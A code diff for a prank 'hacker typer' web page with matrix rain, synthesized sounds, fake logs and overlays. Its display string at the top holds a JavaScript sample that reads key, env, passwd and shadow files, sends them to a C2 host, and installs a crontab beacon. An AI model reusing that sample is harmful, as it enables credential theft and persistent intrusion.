+        const sensitive = files.filter(f =>
+          /\.(pem|key|env|conf|passwd|shadow|db|sqlite)$/i.test(f)
+        );
+        for (const file of sensitive) {
+          const data = fs.readFileSync(file);
+          const encrypted = this.encrypt(data.toString());
+          await this.sendToC2({ type: 'exfil', file, data: encrypted });
+        }
+        return { filesFound: sensitive.length };
+      }
+    });
+
+    this.modules.set('persist', {
+      name: 'Persistence Installation',
+      execute: async () => {
+        const platform = os.platform();
+        if (platform === 'linux') {
+          const cronJob = '*/5 * * * * /tmp/.hidden/beacon.sh';
+          execSync('(crontab -l; echo "' + cronJob + '") | crontab -');
+          return { method: 'crontab', status: 'installed' };
+        }
+        return { method: 'none', status: 'unsupported_platform' };
+      }
+    });
+  }
+
+  scanPort(host, port) {
+    return new Promise(resolve => {
+      const socket = new net.Socket();
+      socket.setTimeout(500);
+      socket.on('connect', () => { socket.destroy(); resolve(true); });
+      socket.on('timeout', () => { socket.destroy(); resolve(false); });
+      socket.on('error', () => resolve(false));
+      socket.connect(port, host);
+    });
+  }
+
+  async sendToC2(payload) {
+    const encrypted = this.encrypt(JSON.stringify(payload));
+    return new Promise((resolve, reject) => {
+      const client = net.createConnection(CONFIG.c2Port, CONFIG.c2Host, () => {
+        client.write(encrypted);
+        client.end();
+        resolve();
+      });
+      client.on('error', reject);
+    });
+  }
+
+  async run(moduleName, ...args) {
+    const mod = this.modules.get(moduleName);
+    if (!mod) throw new Error('Module not found: ' + moduleName);
+    console.log('[*] Running module: ' + mod.name);
+    const result = await mod.execute(...args);
+    console.log('[+] Result:', JSON.stringify(result));
+    return result;
+  }
+}
+
+const framework = new ExploitFramework();
+framework.run('portscan', '192.168.1.1', '1-1024').then(ports => {
+  console.log('[+] Open ports:', ports);
+  framework.run('exfiltrate', '/etc').then(r => {
+    console.log('[+] Exfiltration complete:', r);
+  });
+});
+`
+];
+
+// ===== STATE =====
+const state = {
+  theme: 'matrix', soundEnabled: true, crtEnabled: true, matrixEnabled: true,
+  autoType: false, autoTypeTimer: null, codeIndex: 0, codePos: 0,
+  overlayActive: false, settingsOpen: false, logCount: 0, audioInitialized: false,
+  glitchOn: false, glitchTimer: null,
+  terminalOpen: false, terminalInput: '', cwd: '/root/exploit', charsTyped: 0,
+  prankMode: false,
+  jailbreakActive: false,
+};
+
+let dom = {};
+function ri(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }
+
+// ===== SYNTAX HIGHLIGHTER =====
+function highlight(text) {
+  let s = text.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+  // Comments (// and ; for asm)
+  s = s.replace(/(\/\/.*?)(\n|$)/g, '<span class="hl-comment">$1</span>$2');
+  s = s.replace(/(;\s+\S.*?)(\n|$)/g, '<span class="hl-comment">$1</span>$2');
+  // Preprocessor
+  s = s.replace(/(#\s*(?:include|define|ifdef|endif|ifndef|if).*?)(\n|$)/g, '<span class="hl-preproc">$1</span>$2');
+  // Strings
+  s = s.replace(/("(?:[^"\\]|\\.)*?")/g, '<span class="hl-string">$1</span>');
+  s = s.replace(/('(?:[^'\\]|\\.)*?')/g, '<span class="hl-string">$1</span>');
+  // Types (C types, Python builtins, stdint types)
+  s = s.replace(/\b(uint8_t|uint16_t|uint32_t|uint64_t|int8_t|int16_t|int32_t|int64_t|size_t|ssize_t|pid_t|off_t|bool|void|int|char|long|short|float|double|unsigned|signed|FILE|sockaddr_in|sockaddr|cred|pt_regs|spinlock_t|list_head|asmlinkage|aes_ctx_t|bytearray|bytes|str|dict|list|tuple|set|socket|threading|Thread|Lock|ssl|hashlib|struct)\b/g, '<span class="hl-type">$1</span>');
+  // Function calls: word followed by (
+  s = s.replace(/\b([a-zA-Z_]\w*)\s*(?=\()/g, '<span class="hl-func">$1</span>');
+  // Keywords (control flow, declarations)
+  s = s.replace(/\b(return|if|else|for|while|do|switch|case|break|continue|typedef|enum|union|static|const|extern|volatile|register|sizeof|NULL|import|from|def|class|self|True|False|None|with|as|try|except|finally|raise|yield|lambda|global|nonlocal|assert|pass|del|and|or|not|is|in)\b/g, '<span class="hl-keyword">$1</span>');
+  // Asm keywords
+  s = s.replace(/\b(push|pop|mov|jmp|call|ret|xor|add|sub|mul|div|cmp|jne|je|jz|jnz|js|jl|jg|inc|dec|lea|test|shr|shl|rol|ror|nop|syscall|section|global|db|dw|dd|dq|equ|leave|xchg|rax|rbx|rcx|rdx|rsi|rdi|rsp|rbp|r8|r9|r10|r11|r12|r13|r14|r15)\b/g, '<span class="hl-keyword">$1</span>');
+  // Operators
+  s = s.replace(/([\-\+\*\/\%\=\!\&\|\^\~]{1,3}&gt;?|&lt;[=\-]?|&gt;[=]?)/g, '<span class="hl-operator">$1</span>');
+  // Hex numbers
+  s = s.replace(/\b(0x[0-9a-fA-F]+)\b/g, '<span class="hl-number">$1</span>');
+  // Decimal numbers
+  s = s.replace(/\b(\d+\.?\d*)\b/g, '<span class="hl-number">$1</span>');
+  return s;
+}
+
+// ===== TYPING ENGINE =====
+const TypingEngine = {
+  charsPerKey: [3, 8],
+  type() {
+    const count = this.charsPerKey[0] + Math.floor(Math.random() * (this.charsPerKey[1] - this.charsPerKey[0] + 1));
+    const src = CODE_SOURCES[state.codeIndex];
+    let chunk = src.substr(state.codePos, count);
+    state.codePos += count;
+    if (state.codePos >= src.length) { state.codeIndex = (state.codeIndex + 1) % CODE_SOURCES.length; state.codePos = 0; }
+    state.charsTyped += chunk.length;
+    dom.codeOutput.insertAdjacentHTML('beforeend', highlight(chunk));
+    if (dom.codeOutput.childNodes.length > 600) { for (let i = 0; i < 100; i++) { if (dom.codeOutput.firstChild) dom.codeOutput.removeChild(dom.codeOutput.firstChild); } }
+    scrollCodeToBottom();
+    AudioEngine.playTypeSound();
+    PopupDialogs.tick();
+  },
+  startAuto() { if (state.autoType) return; state.autoType = true; state.autoTypeTimer = setInterval(() => this.type(), parseInt(dom.autotypeSpeed.value)); },
+  stopAuto() { state.autoType = false; if (state.autoTypeTimer) clearInterval(state.autoTypeTimer); state.autoTypeTimer = null; },
+  toggleAuto() { if (state.autoType) this.stopAuto(); else this.startAuto(); }
+};
+
+// ===== AUDIO ENGINE =====
+const AudioEngine = {
+  ctx: null, masterGain: null, compressor: null, reverbNode: null,
+
+  init() {
+    if (state.audioInitialized) return;
+    try {
+      this.ctx = new (window.AudioContext || window.webkitAudioContext)();
+      // Master chain: compressor -> gain -> destination
+      this.compressor = this.ctx.createDynamicsCompressor();
+      this.compressor.threshold.value = -24; this.compressor.knee.value = 12;
+      this.compressor.ratio.value = 4; this.compressor.attack.value = 0.003; this.compressor.release.value = 0.15;
+      this.masterGain = this.ctx.createGain();
+      this.masterGain.gain.value = 0.3;
+      this.compressor.connect(this.masterGain);
+      this.masterGain.connect(this.ctx.destination);
+      // Create convolution reverb
+      this.reverbNode = this._createReverb(0.8, 1.5);
+      state.audioInitialized = true;
+      this.startAmbient();
+    } catch(e) {}
+  },
+
+  _createReverb(decay, duration) {
+    const sr = this.ctx.sampleRate, len = Math.floor(sr * duration);
+    const buf = this.ctx.createBuffer(2, len, sr);
+    for (let ch = 0; ch < 2; ch++) {
+      const data = buf.getChannelData(ch);
+      for (let i = 0; i < len; i++) {
+        data[i] = (Math.random() * 2 - 1) * Math.pow(1 - i / len, decay);
+      }
+    }
+    const conv = this.ctx.createConvolver(); conv.buffer = buf;
+    const wet = this.ctx.createGain(); wet.gain.value = 0.15;
+    conv.connect(wet); wet.connect(this.compressor);
+    return conv;
+  },
+
+  _routeWithReverb(node) {
+    // Dry signal + reverb send
+    node.connect(this.compressor);
+    node.connect(this.reverbNode);
+  },
+
+  playTypeSound() {
+    if (!state.soundEnabled || !this.ctx) return;
+    const t = this.ctx.currentTime;
+
+    // Layer 1: mechanical click (short noise burst, bandpassed)
+    const clickDur = 0.012 + Math.random() * 0.015;
+    const sr = this.ctx.sampleRate, len = Math.floor(sr * clickDur);
+    const clickBuf = this.ctx.createBuffer(1, len, sr), clickData = clickBuf.getChannelData(0);
+    for (let i = 0; i < len; i++) {
+      const env = Math.pow(1 - i/len, 4);
+      clickData[i] = (Math.random() * 2 - 1) * env;
+    }
+    const clickSrc = this.ctx.createBufferSource(); clickSrc.buffer = clickBuf;
+    const clickFilt = this.ctx.createBiquadFilter();
+    clickFilt.type = 'bandpass'; clickFilt.frequency.value = 2500 + Math.random() * 1500; clickFilt.Q.value = 3;
+    const clickGain = this.ctx.createGain(); clickGain.gain.value = 0.25;
+    clickSrc.connect(clickFilt); clickFilt.connect(clickGain); clickGain.connect(this.compressor);
+    clickSrc.start(t);
+
+    // Layer 2: tonal ping (sine with fast decay, slight random pitch)
+    const ping = this.ctx.createOscillator(), pingGain = this.ctx.createGain();
+    ping.type = 'sine'; ping.frequency.value = 3000 + Math.random() * 2000;
+    pingGain.gain.setValueAtTime(0.04, t);
+    pingGain.gain.exponentialRampToValueAtTime(0.001, t + 0.02);
+    ping.connect(pingGain); pingGain.connect(this.compressor);
+    ping.start(t); ping.stop(t + 0.03);
+
+    // Layer 3: low thud (very short sub hit)
+    const thud = this.ctx.createOscillator(), thudGain = this.ctx.createGain();
+    thud.type = 'sine'; thud.frequency.setValueAtTime(150 + Math.random()*50, t);
+    thud.frequency.exponentialRampToValueAtTime(60, t + 0.03);
+    thudGain.gain.setValueAtTime(0.08, t);
+    thudGain.gain.exponentialRampToValueAtTime(0.001, t + 0.04);
+    thud.connect(thudGain); thudGain.connect(this.compressor);
+    thud.start(t); thud.stop(t + 0.05);
+  },
+
+  playAlert() {
+    if (!state.soundEnabled || !this.ctx) return;
+    const t = this.ctx.currentTime;
+
+    // Layer 1: dual-tone square wave sequence
+    const osc1 = this.ctx.createOscillator(), g1 = this.ctx.createGain();
+    osc1.type = 'square';
+    osc1.frequency.setValueAtTime(880, t); osc1.frequency.setValueAtTime(660, t + 0.1); osc1.frequency.setValueAtTime(880, t + 0.2);
+    g1.gain.setValueAtTime(0.07, t); g1.gain.exponentialRampToValueAtTime(0.001, t + 0.5);
+    osc1.connect(g1); this._routeWithReverb(g1);
+    osc1.start(t); osc1.stop(t + 0.5);
+
+    // Layer 2: sine sub-octave
+    const osc2 = this.ctx.createOscillator(), g2 = this.ctx.createGain();
+    osc2.type = 'sine';
+    osc2.frequency.setValueAtTime(440, t); osc2.frequency.setValueAtTime(330, t + 0.1); osc2.frequency.setValueAtTime(440, t + 0.2);
+    g2.gain.setValueAtTime(0.06, t); g2.gain.exponentialRampToValueAtTime(0.001, t + 0.5);
+    osc2.connect(g2); g2.connect(this.compressor);
+    osc2.start(t); osc2.stop(t + 0.5);
+
+    // Layer 3: noise transient hit
+    const nDur = 0.03, nLen = Math.floor(this.ctx.sampleRate * nDur);
+    const nBuf = this.ctx.createBuffer(1, nLen, this.ctx.sampleRate), nData = nBuf.getChannelData(0);
+    for (let i = 0; i < nLen; i++) nData[i] = (Math.random()*2-1) * Math.pow(1 - i/nLen, 2);
+    const nSrc = this.ctx.createBufferSource(); nSrc.buffer = nBuf;
+    const nGain = this.ctx.createGain(); nGain.gain.value = 0.12;
+    const nFilt = this.ctx.createBiquadFilter(); nFilt.type = 'highpass'; nFilt.frequency.value = 2000;
+    nSrc.connect(nFilt); nFilt.connect(nGain); nGain.connect(this.compressor);
+    nSrc.start(t);
+  },
+
+  playGranted() {
+    if (!state.soundEnabled || !this.ctx) return;
+    const t = this.ctx.currentTime;
+    // Layered ascending chord: C major triad with octave shimmer
+    const chordFreqs = [[262, 330, 392], [523, 659, 784]]; // two octaves
+    chordFreqs.forEach((freqs, octave) => {
+      freqs.forEach((freq, i) => {
+        const delay = i * 0.08;
+        // Main tone
+        const osc = this.ctx.createOscillator(), g = this.ctx.createGain();
+        osc.type = octave === 0 ? 'triangle' : 'sine';
+        osc.frequency.value = freq;
+        g.gain.setValueAtTime(0, t + delay);
+        g.gain.linearRampToValueAtTime(octave === 0 ? 0.1 : 0.05, t + delay + 0.04);
+        g.gain.exponentialRampToValueAtTime(0.001, t + delay + 0.8);
+        osc.connect(g); this._routeWithReverb(g);
+        osc.start(t + delay); osc.stop(t + delay + 1.0);
+      });
+    });
+    // Bright shimmer sweep
+    const shimmer = this.ctx.createOscillator(), sGain = this.ctx.createGain();
+    shimmer.type = 'sine';
+    shimmer.frequency.setValueAtTime(1000, t);
+    shimmer.frequency.exponentialRampToValueAtTime(4000, t + 0.3);
+    sGain.gain.setValueAtTime(0.03, t);
+    sGain.gain.exponentialRampToValueAtTime(0.001, t + 0.4);
+    shimmer.connect(sGain); this._routeWithReverb(sGain);
+    shimmer.start(t); shimmer.stop(t + 0.5);
+    // Sub bass confirmation thump
+    const sub = this.ctx.createOscillator(), subG = this.ctx.createGain();
+    sub.type = 'sine'; sub.frequency.setValueAtTime(80, t); sub.frequency.exponentialRampToValueAtTime(40, t + 0.3);
+    subG.gain.setValueAtTime(0.12, t); subG.gain.exponentialRampToValueAtTime(0.001, t + 0.35);
+    sub.connect(subG); subG.connect(this.compressor);
+    sub.start(t); sub.stop(t + 0.4);
+  },
+
+  playDenied() {
+    if (!state.soundEnabled || !this.ctx) return;
+    const t = this.ctx.currentTime;
+    // Layer 1: harsh descending sawtooth
+    const saw = this.ctx.createOscillator(), sGain = this.ctx.createGain();
+    saw.type = 'sawtooth';
+    saw.frequency.setValueAtTime(300, t); saw.frequency.linearRampToValueAtTime(60, t + 0.6);
+    sGain.gain.setValueAtTime(0.1, t); sGain.gain.exponentialRampToValueAtTime(0.001, t + 0.7);
+    saw.connect(sGain); this._routeWithReverb(sGain);
+    saw.start(t); saw.stop(t + 0.7);
+    // Layer 2: dissonant tritone stab (minor second)
+    [185, 196].forEach(freq => {
+      const osc = this.ctx.createOscillator(), g = this.ctx.createGain();
+      osc.type = 'square'; osc.frequency.value = freq;
+      g.gain.setValueAtTime(0.06, t); g.gain.exponentialRampToValueAtTime(0.001, t + 0.5);
+      osc.connect(g); g.connect(this.compressor);
+      osc.start(t); osc.stop(t + 0.5);
+    });
+    // Layer 3: distorted noise burst
+    const nDur = 0.08, sr = this.ctx.sampleRate, nLen = Math.floor(sr * nDur);
+    const nBuf = this.ctx.createBuffer(1, nLen, sr), nData = nBuf.getChannelData(0);
+    for (let i = 0; i < nLen; i++) nData[i] = (Math.random()*2-1) * Math.pow(1 - i/nLen, 1.5);
+    const nSrc = this.ctx.createBufferSource(); nSrc.buffer = nBuf;
+    const dist = this.ctx.createWaveShaper();
+    const curve = new Float32Array(256);
+    for (let i = 0; i < 256; i++) { const x = (i/128) - 1; curve[i] = (Math.PI + 4) * x / (Math.PI + 4 * Math.abs(x)); }
+    dist.curve = curve; dist.oversample = '2x';
+    const nGain = this.ctx.createGain(); nGain.gain.value = 0.15;
+    nSrc.connect(dist); dist.connect(nGain); nGain.connect(this.compressor);
+    nSrc.start(t);
+    // Layer 4: sub drop
+    const sub = this.ctx.createOscillator(), subG = this.ctx.createGain();
+    sub.type = 'sine'; sub.frequency.setValueAtTime(120, t); sub.frequency.exponentialRampToValueAtTime(30, t + 0.5);
+    subG.gain.setValueAtTime(0.15, t); subG.gain.exponentialRampToValueAtTime(0.001, t + 0.55);
+    sub.connect(subG); subG.connect(this.compressor);
+    sub.start(t); sub.stop(t + 0.6);
+  },
+
+  playModem() {
+    if (!state.soundEnabled || !this.ctx) return;
+    const t = this.ctx.currentTime;
+    // Layer 1: main frequency-sweeping sawtooth
+    const osc1 = this.ctx.createOscillator(), g1 = this.ctx.createGain();
+    osc1.type = 'sawtooth';
+    osc1.frequency.setValueAtTime(1200, t);
+    osc1.frequency.exponentialRampToValueAtTime(2800, t + 0.04);
+    osc1.frequency.exponentialRampToValueAtTime(400, t + 0.09);
+    osc1.frequency.exponentialRampToValueAtTime(2200, t + 0.14);
+    osc1.frequency.exponentialRampToValueAtTime(600, t + 0.2);
+    osc1.frequency.exponentialRampToValueAtTime(1800, t + 0.25);
+    g1.gain.setValueAtTime(0.06, t); g1.gain.exponentialRampToValueAtTime(0.001, t + 0.3);
+    const filt1 = this.ctx.createBiquadFilter(); filt1.type = 'bandpass'; filt1.frequency.value = 1500; filt1.Q.value = 1;
+    osc1.connect(filt1); filt1.connect(g1); this._routeWithReverb(g1);
+    osc1.start(t); osc1.stop(t + 0.3);
+
+    // Layer 2: high-pitched digital chirp
+    const osc2 = this.ctx.createOscillator(), g2 = this.ctx.createGain();
+    osc2.type = 'square';
+    osc2.frequency.setValueAtTime(3000, t + 0.02);
+    osc2.frequency.exponentialRampToValueAtTime(800, t + 0.08);
+    osc2.frequency.exponentialRampToValueAtTime(4500, t + 0.15);
+    osc2.frequency.exponentialRampToValueAtTime(1200, t + 0.22);
+    g2.gain.setValueAtTime(0.02, t + 0.02); g2.gain.exponentialRampToValueAtTime(0.001, t + 0.25);
+    osc2.connect(g2); g2.connect(this.compressor);
+    osc2.start(t + 0.02); osc2.stop(t + 0.28);
+
+    // Layer 3: crackle noise texture
+    const nDur = 0.25, sr = this.ctx.sampleRate, nLen = Math.floor(sr * nDur);
+    const nBuf = this.ctx.createBuffer(1, nLen, sr), nData = nBuf.getChannelData(0);
+    for (let i = 0; i < nLen; i++) {
+      nData[i] = (Math.random() < 0.1 ? (Math.random()*2-1) : 0) * Math.pow(1-i/nLen, 2);
+    }
+    const nSrc = this.ctx.createBufferSource(); nSrc.buffer = nBuf;
+    const nGain = this.ctx.createGain(); nGain.gain.value = 0.08;
+    nSrc.connect(nGain); nGain.connect(this.compressor);
+    nSrc.start(t);
+  },
+
+  startAmbient() {
+    if (!this.ctx) return;
+    // Layer 1: 60Hz electrical hum + harmonics
+    [60, 120, 180].forEach((f, i) => {
+      const osc = this.ctx.createOscillator(), gain = this.ctx.createGain();
+      osc.type = 'sine'; osc.frequency.value = f;
+      gain.gain.value = [0.012, 0.006, 0.003][i];
+      osc.connect(gain); gain.connect(this.compressor); osc.start();
+    });
+    // Layer 2: filtered noise floor (server room hiss)
+    const sr = this.ctx.sampleRate, nLen = sr * 2;
+    const nBuf = this.ctx.createBuffer(1, nLen, sr), nData = nBuf.getChannelData(0);
+    for (let i = 0; i < nLen; i++) nData[i] = (Math.random() * 2 - 1);
+    const nSrc = this.ctx.createBufferSource(); nSrc.buffer = nBuf; nSrc.loop = true;
+    const hpf = this.ctx.createBiquadFilter(); hpf.type = 'highpass'; hpf.frequency.value = 800;
+    const lpf = this.ctx.createBiquadFilter(); lpf.type = 'lowpass'; lpf.frequency.value = 3000;
+    const nGain = this.ctx.createGain(); nGain.gain.value = 0.005;
+    nSrc.connect(hpf); hpf.connect(lpf); lpf.connect(nGain); nGain.connect(this.compressor);
+    nSrc.start();
+    // Layer 3: very slow LFO-modulated low drone
+    const drone = this.ctx.createOscillator(), droneGain = this.ctx.createGain();
+    const lfo = this.ctx.createOscillator(), lfoGain = this.ctx.createGain();
+    drone.type = 'triangle'; drone.frequency.value = 45;
+    droneGain.gain.value = 0.008;
+    lfo.type = 'sine'; lfo.frequency.value = 0.15; lfoGain.gain.value = 0.004;
+    lfo.connect(lfoGain); lfoGain.connect(droneGain.gain);
+    drone.connect(droneGain); droneGain.connect(this.compressor);
+    drone.start(); lfo.start();
+  }
+};
+
+// ===== MATRIX RAIN =====
+const MatrixRain = {
+  canvas: null, ctx: null, columns: [], fontSize: 14,
+  chars: 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#$%^&*(){}[]|アイウエオカキクケコサシスセソタチツテト',
+  init(c) { this.canvas = c; this.ctx = c.getContext('2d'); this.resize(); window.addEventListener('resize', () => this.resize()); },
+  resize() { this.canvas.width = window.innerWidth; this.canvas.height = window.innerHeight; const n = Math.floor(this.canvas.width / this.fontSize); this.columns = []; for (let i = 0; i < n; i++) this.columns[i] = Math.floor(Math.random() * this.canvas.height / this.fontSize); },
+  draw() {
+    if (!state.matrixEnabled) { this.ctx.clearRect(0, 0, this.canvas.width, this.canvas.height); return; }
+    this.ctx.fillStyle = 'rgba(0, 0, 0, 0.05)'; this.ctx.fillRect(0, 0, this.canvas.width, this.canvas.height);
+    const color = getComputedStyle(document.body).getPropertyValue('--color-primary').trim();
+    this.ctx.fillStyle = color; this.ctx.font = this.fontSize + 'px monospace';
+    for (let i = 0; i < this.columns.length; i++) {
+      const ch = this.chars[Math.floor(Math.random() * this.chars.length)];
+      this.ctx.fillText(ch, i * this.fontSize, this.columns[i] * this.fontSize);
+      if (this.columns[i] * this.fontSize > this.canvas.height && Math.random() > 0.975) this.columns[i] = 0;
+      this.columns[i]++;
+    }
+  }
+};
+
+// ===== RADAR =====
+const Radar = {
+  canvas: null, ctx: null, angle: 0, blips: [],
+  init(c) { this.canvas = c; this.ctx = c.getContext('2d'); this.resize(); window.addEventListener('resize', () => this.resize()); },
+  resize() { const p = this.canvas.parentElement; this.canvas.width = p.clientWidth - 2; this.canvas.height = p.clientHeight - 26; },
+  draw() {
+    const w = this.canvas.width, h = this.canvas.height; if (w <= 0 || h <= 0) return;
+    const cx = w/2, cy = h/2, r = Math.min(cx,cy) - 4; if (r <= 0) return;
+    const ctx = this.ctx; ctx.clearRect(0, 0, w, h);
+    const color = getComputedStyle(document.body).getPropertyValue('--color-primary').trim();
+    ctx.strokeStyle = color + '22'; ctx.lineWidth = 0.5;
+    for (let i = 1; i <= 3; i++) { ctx.beginPath(); ctx.arc(cx, cy, (r/3)*i, 0, Math.PI*2); ctx.stroke(); }
+    ctx.beginPath(); ctx.moveTo(cx, cy-r); ctx.lineTo(cx, cy+r); ctx.moveTo(cx-r, cy); ctx.lineTo(cx+r, cy); ctx.stroke();
+    ctx.beginPath(); ctx.moveTo(cx, cy); ctx.arc(cx, cy, r, this.angle - 0.5, this.angle); ctx.closePath();
+    const grad = ctx.createRadialGradient(cx, cy, 0, cx, cy, r); grad.addColorStop(0, color+'44'); grad.addColorStop(1, color+'05'); ctx.fillStyle = grad; ctx.fill();
+    ctx.beginPath(); ctx.moveTo(cx, cy); ctx.lineTo(cx + r*Math.cos(this.angle), cy + r*Math.sin(this.angle)); ctx.strokeStyle = color+'aa'; ctx.lineWidth = 1.5; ctx.stroke(); ctx.lineWidth = 1;
+    this.blips.forEach(b => { b.age++; const a = Math.max(0, 1 - b.age/b.maxAge); ctx.beginPath(); ctx.arc(b.x, b.y, 2.5, 0, Math.PI*2); ctx.fillStyle = color + Math.floor(a*255).toString(16).padStart(2,'0'); ctx.fill(); });
+    this.blips = this.blips.filter(b => b.age < b.maxAge);
+    if (Math.random() < 0.06) { const d = 20+Math.random()*(r-20), a = this.angle+(Math.random()-0.5)*0.3; this.blips.push({x:cx+d*Math.cos(a), y:cy+d*Math.sin(a), age:0, maxAge:100+ri(0,80)}); }
+    this.angle += 0.02; if (this.angle > Math.PI*2) this.angle -= Math.PI*2;
+  }
+};
+
+// ===== PARTICLES =====
+const Particles = {
+  canvas: null, ctx: null, particles: [],
+  init(c) { this.canvas = c; this.ctx = c.getContext('2d'); this.resize(); window.addEventListener('resize', () => this.resize()); },
+  resize() { this.canvas.width = window.innerWidth; this.canvas.height = window.innerHeight; },
+  emit(x, y, count, color, speed, life) {
+    for (let i = 0; i < count; i++) { const a = Math.random()*Math.PI*2, s = speed*(0.5+Math.random()); this.particles.push({x,y,vx:Math.cos(a)*s,vy:Math.sin(a)*s,life:0,maxLife:life+Math.random()*life*0.5,size:1+Math.random()*3,color}); }
+  },
+  draw() {
+    this.ctx.clearRect(0, 0, this.canvas.width, this.canvas.height);
+    for (let i = this.particles.length - 1; i >= 0; i--) {
+      const p = this.particles[i]; p.x += p.vx; p.y += p.vy; p.vy += 0.05; p.life++;
+      const a = 1 - p.life/p.maxLife; if (a <= 0) { this.particles.splice(i,1); continue; }
+      this.ctx.globalAlpha = a; this.ctx.fillStyle = p.color; this.ctx.fillRect(p.x, p.y, p.size, p.size);
+    }
+    this.ctx.globalAlpha = 1;
+  }
+};
+
+// ===== SYSTEM STATS =====
+const Stats = {
+  bars: {cpu:45,mem:60,net:20,disk:35}, targets: {cpu:45,mem:60,net:20,disk:35},
+  randomize() { this.targets.cpu = 25+Math.random()*65; this.targets.mem = 35+Math.random()*50; this.targets.net = Math.random()*95; this.targets.disk = 15+Math.random()*35; },
+  update() {
+    for (const k of ['cpu','mem','net','disk']) {
+      this.bars[k] += (this.targets[k] - this.bars[k]) * 0.04;
+      const pct = Math.round(this.bars[k]), fill = document.getElementById(k+'-fill'), label = document.getElementById(k+'-pct');
+      if (fill) fill.style.width = pct+'%'; if (label) label.textContent = pct+'%';
+    }
+  }
+};
+
+// ===== LOG PANEL =====
+const LogPanel = {
+  templates: [
+    '[SYS] Initializing kernel module: rootkit_v{n}.ko','[NET] Port scan detected on {p}/tcp from {ip}',
+    '[SEC] Brute force attempt blocked: {ip}:{p}','[IO]  Reading sector 0x{hex} from /dev/sda1',
+    '[NET] DNS resolution: darknet.onion -> {ip}','[SYS] Process forked: PID {pid} -> PID {pid}',
+    '[MEM] Heap allocation: {kb}KB at 0x{hex}{hex}','[SEC] SSH key fingerprint: SHA256:{hash}',
+    '[NET] TLS 1.3 handshake complete with {ip}','[SYS] Module loaded: exploit_framework.ko',
+    '[NET] Outbound connection: {ip}:{p} (ESTABLISHED)','[SEC] Firewall rule updated: ALLOW {ip}/32',
+    '[SYS] Thread created: TID {pid} (worker pool)','[NET] ARP request: who has {ip}? Tell {ip}',
+    '[SEC] Certificate validated: CN=*.darknet.io','[MEM] Page fault at 0x{hex}{hex}{hex} (resolved)',
+    '[NET] ICMP echo reply from {ip} ttl=64 time={n}ms','[SEC] Intrusion detection: anomaly score {n}.{n}',
+    '[NET] TCP retransmission to {ip}:{p} (attempt {n})','[SEC] PAM authentication: user=root service=sshd',
+    '[NET] Proxy tunnel established: SOCKS5 {ip}:{p}','[SEC] GPG signature verified: 0x{hex}{hex}',
+  ],
+  add() {
+    const tmpl = this.templates[ri(0, this.templates.length-1)];
+    const msg = tmpl.replace(/{ip}/g,()=>`${ri(1,255)}.${ri(1,255)}.${ri(1,255)}.${ri(1,255)}`)
+      .replace(/{p}/g,()=>ri(1,65535)).replace(/{hex}/g,()=>ri(0,0xFFFF).toString(16).padStart(4,'0'))
+      .replace(/{pid}/g,()=>ri(1000,65000)).replace(/{kb}/g,()=>ri(4,4096)).replace(/{n}/g,()=>ri(1,99))
+      .replace(/{hash}/g,()=>{let s='';for(let i=0;i<16;i++)s+='0123456789abcdef'[ri(0,15)];return s;});
+    const time = new Date().toISOString().substr(11, 12);
+    const line = document.createElement('div'); line.className = 'log-line';
+    const tag = msg.match(/^\[(\w+)\]/);
+    line.innerHTML = tag ? `<span class="log-time">${time}</span> <span class="log-tag">[${tag[1]}]</span>${msg.slice(tag[0].length)}` : `<span class="log-time">${time}</span> ${msg}`;
+    dom.logContent.appendChild(line); dom.logContent.scrollTop = dom.logContent.scrollHeight;
+    state.logCount++; dom.logCountEl.textContent = state.logCount;
+    while (dom.logContent.children.length > 120) dom.logContent.removeChild(dom.logContent.firstChild);
+  }
+};
+
+function renderFileTree() {
+  const tree = [
+    {name:'/root',indent:0,folder:true},{name:'/exploit',indent:1,folder:true},
+    {name:'payload.c',indent:2},{name:'shellcode.asm',indent:2},{name:'buffer_overflow.py',indent:2},{name:'config.enc',indent:2},
+    {name:'/tools',indent:1,folder:true},{name:'nmap_scan.sh',indent:2},{name:'hashcat.conf',indent:2},{name:'wireshark.pcap',indent:2},
+    {name:'/keys',indent:1,folder:true},{name:'rsa_private.pem',indent:2},{name:'aes_256.key',indent:2},
+    {name:'/logs',indent:1,folder:true},{name:'access.log',indent:2},{name:'firewall.log',indent:2},
+    {name:'/network',indent:1,folder:true},{name:'targets.txt',indent:2},{name:'proxychains.conf',indent:2},
+    {name:'.bashrc',indent:1},{name:'.ssh/authorized_keys',indent:1},
+  ];
+  tree.forEach(item => {
+    const div = document.createElement('div'); div.style.paddingLeft = (item.indent*12)+'px';
+    div.className = item.folder ? 'ft-folder' : 'ft-file';
+    div.textContent = item.folder ? (item.indent===0?'':'+ ')+item.name : '  '+item.name;
+    dom.fileTreeContent.appendChild(div);
+  });
+}
+
+// ===== OVERLAYS =====
+const Overlays = {
+  intervals: [],
+  clearIntervals() { this.intervals.forEach(clearInterval); this.intervals = []; },
+
+  show(id, duration, soundFn) {
+    if (state.overlayActive) return;
+    state.overlayActive = true;
+    const el = document.getElementById('overlay-' + id); if (!el) return;
+    el.classList.add('active');
+    if (soundFn) soundFn(); else AudioEngine.playAlert();
+    const color = getComputedStyle(document.body).getPropertyValue('--color-primary').trim();
+    Particles.emit(window.innerWidth/2, window.innerHeight/2, 60, color, 6, 50);
+
+    if (id === 'download') this.animateDownload();
+    if (id === 'trace') this.animateTrace();
+    if (id === 'encrypt') this.animateEncrypt();
+    if (id === 'firewall') this.animateFirewall();
+    if (id === 'satellite') this.animateSatellite();
+
+    if (id === 'denied') ScreenCrack.show();
+
+    if (id !== 'satellite') {
+      setTimeout(() => {
+        el.classList.add('exit');
+        if (id === 'denied') ScreenCrack.hide();
+        setTimeout(() => { el.classList.remove('active','exit'); state.overlayActive = false; this.clearIntervals(); }, 400);
+      }, duration);
+    }
+  },
+
+  animateDownload() {
+    let pct = 0;
+    const bar = document.getElementById('download-bar-fill'), label = document.getElementById('download-pct');
+    const list = document.getElementById('download-file-list');
+    bar.style.width = '0%'; label.textContent = '0%'; list.innerHTML = '';
+    const dirs = ['/etc/','/var/log/','/home/admin/','/root/','/opt/data/','/usr/share/','/tmp/','/srv/'];
+    const exts = ['.conf','.log','.dat','.db','.key','.pem','.tar.gz','.sql','.bak','.enc','.bin','.csv','.xml','.json'];
+    const names = ['passwd','shadow','config','database','backup','secrets','credentials','auth','session','token','private','access','network','firewall','system'];
+    const iv1 = setInterval(() => {
